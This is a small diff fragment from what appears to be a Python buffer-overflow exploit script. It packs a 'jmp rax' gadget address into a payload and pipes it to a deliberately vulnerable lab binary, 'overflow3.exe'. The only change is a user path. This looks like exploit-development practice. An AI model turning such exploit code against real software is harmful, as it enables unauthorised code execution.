@@ -367,7 +367,7 @@ payload += struct.pack("<Q", 0x14000192f)  # jmp rax;
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
